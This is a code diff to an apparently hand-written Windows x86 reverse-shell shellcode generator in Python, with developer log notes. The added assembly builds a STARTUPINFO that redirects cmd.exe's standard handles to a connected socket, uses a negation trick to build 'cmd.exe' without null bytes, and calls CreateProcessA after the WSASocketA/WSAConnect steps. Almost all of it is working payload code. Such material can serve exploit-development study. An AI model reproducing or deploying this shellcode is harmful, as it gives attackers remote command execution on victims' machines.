@@ -202,6 +202,10 @@ currently its fine, but it does tend to add more instructions for no reason
 
 15jan_517p: something is wrong w the handle, getting 0xFFFFFFFF in EAX after the call
 
+27jan_1147a: fixed, WSAConnect wasnt resolved, rest was fine.
+moving onto CreateProcessA to spawn cmd.exe
+
+
 """
 
 import ctypes
@@ -385,7 +389,6 @@ def ret_asm() -> str:
         push eax                                    ; Push AF
         call [ebp + 0x20]                           ; Call WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_IP, 0, 0, 0)
 
-        int3
 
     ; ===== CALL_WSACONNECT: Setup args and call WSAConnect =====
     ; WSAConnect(s, *name, namelen, lpCallerData, lpCalleeData, lpSQOS, lpGQOS)
@@ -426,6 +429,102 @@ def ret_asm() -> str:
         call [ebp + 0x24]                           ; Call WSAConnect
 
     ; ===== CREATE_PROCESS: Setup args and call CreateProcessA to spawn cmd.exe =====
+    ; CreateProcessA(lpApplicationName, lpCommandLine, lpProcessAttributes, lpThreadAttributes, bInheritHandles
+    ;                dwCreationFlags, lpEnvironment, lpCurrentDirectory, lpStartupInfo, lpProcessInformation)
+    ; lpApplicationName = cmd.exe
+    ; lpCommandLine = NULL <- can be NULL to use application name
+    ; lpProcessAttributes = NULL <- default security, defines inheritance
+    ; lpThreadAttributes = NULL <- default security, defines inheritance + ACL
+    ; bInheritHandles = TRUE <- inherit handles from parent process
+    ; dwCreationFlags = 0 <- default behavior
+    ; lpEnvironment = NULL <- use parent process environment
+    ; lpCurrentDirectory = NULL <- use parent process current directory
+    ; lpStartupInfo = pointer to STARTUPINFO struct
+    ; lpProcessInformation = pointer to PROCESS_INFORMATION struct
+
+    ; struct STARTUPINFO [
+    ;     DWORD   cb;                   ; Size of the structure in bytes. Default: sizeof(STARTUPINFO) = 0x44
+    ;     LPSTR   lpReserved;           ; Reserved, must be NULL
+    ;     LPSTR   lpDesktop;            ; Desktop name, set to NULL
+    ;     LPSTR   lpTitle;              ; Title for the new process window, set to NULL
+    ;     DWORD   dwX;                  ; X position of the window, set to NULL
+    ;     DWORD   dwY;                  ; Y position of the window, set to NULL
+    ;     DWORD   dwXSize;              ; Width of the window, set to NULL
+    ;     DWORD   dwYSize;              ; Height of the window, set to NULL
+    ;     DWORD   dwXCountChars;        ; Screen buffer width, set to NULL
+    ;     DWORD   dwYCountChars;        ; Screen buffer height, set to NULL
+    ;     DWORD   dwFillAttribute;      ; Screen buffer fill attribute, set to NULL
+    ;     DWORD   dwFlags;              ; Startup options, set to STARTF_USESTDHANDLES(0x100), needed to redirect std handles    
+    ;     WORD    wShowWindow;          ; Window show state, must be NULL to disable cmd window  
+    ;     WORD    cbReserved2;          ; Reserved, must be NULL
+    ;     LPBYTE  lpReserved2;          ; Reserved, must be NULL
+    ;     HANDLE  hStdInput;            ; Standard input handle
+    ;     HANDLE  hStdOutput;           ; Standard output handle
+    ;     HANDLE  hStdError;            ; Standard error handle
+    ; ]
+    ; For cmd.exe, cb = 0x44, dwFlags = 0x100, rest are all null
+    
+    CREATE_STARTUPINFOA:
+        push esi                        ; Push hSTDError, ESI currently holds socketDescriptor
+        push esi                        ; Push hSTDOutput
+        push esi                        ; Push hSTDInput
+        xor eax, eax                    ; EAX = 0
+        push eax                        ; Push lpReserved2
+        push eax                        ; Push cbReserved2 + wShowWindow
+        xor ecx, ecx                    ; ECX = 0
+        mov al, 0x80                    ; EAX = 0x80
+        mov cx, 0x80                    ; CX =  0x80 
+        add eax, ecx                    ; EAX = 0x100 (dwFlags = STARTF_USESTDHANDLES)
+        push eax                        ; Push dwFlags
+        xor eax, eax                    ; EAX = 0
+        push eax                        ; Push dwFillAttribute
+        push eax                        ; Push dwYCountChars
+        push eax                        ; Push dwXCountChars
+        push eax                        ; Push dwYSize
+        push eax                        ; Push dwXSize
+        push eax                        ; Push dwY
+        push eax                        ; Push dwX
+        push eax                        ; Push lpTitle
+        push eax                        ; Push lpDesktop
+        push eax                        ; Push lpReserved
+        mov eax, 0x44                   ; EAX = 0x44 (size of STARTUPINFO)
+        push eax                        ; Push cb
+        push esp                        ; Push pointer to STARTUPINFO structure
+        pop edi                         ; EDI = pointer to STARTUPINFO
+
+    ;cmd.exe string creation
+    CREATE_CMD_STR:
+        mov eax, 0xFF9A879B                 ; EAX = 'exe.'
+        neg eax
+        push eax                            ; Push 'exe.'
+        mov eax, 0x2e646d63                 ; EAX = 'cmd.'
+        push eax                            ; Push 'cmd.'
+        push esp                            ; Push pointer to "cmd.exe" string
+        pop ebx                             ; EBX = pointer to "cmd.exe"
+
+    ; everything is ready, call createProcessA
+    CALL_CREATEPROCESSA:
+        mov eax, esp                    ; EAX = ESP
+        xor ecx, ecx                    ; ECX = 0
+        mov cx, 0x390                   ; CX = 0x390
+        sub eax, ecx                    ; EAX -= ECX to avoid overwriting stack later
+        push eax                        ; Push pointer to PROCESS_INFORMATION structure
+        push edi                        ; Push pointer to STARTUPINFO structure
+        xor eax, eax                    ; EAX = 0
+        push eax                        ; Push lpCurrentDirectory = NULL
+        push eax                        ; Push lpEnvironment = NULL
+        push eax                        ; Push dwCreationFlags = 0
+        inc eax                         ; EAX = 1
+        push eax                        ; Push bInheritHandles = TRUE
+        dec eax                         ; EAX = 0
+        push eax                        ; Push lpThreadAttributes = NULL
+        push eax                        ; Push lpProcessAttributes = NULL
+        push ebx                        ; Push pointer to "cmd.exe" string
+        push eax                        ; Push lpApplicationName = NULL
+        call [ebp + 0x18]               ; Call CreateProcessA("cmd.exe", NULL, NULL, NULL, TRUE, 0, NULL, NULL, &STARTUPINFO, &PROCESS_INFORMATION)
+        
+        int3
+
 
         
     ; ===== EXIT_PROCESS: With everything ready in the stack we can proceed w our func calls here =====
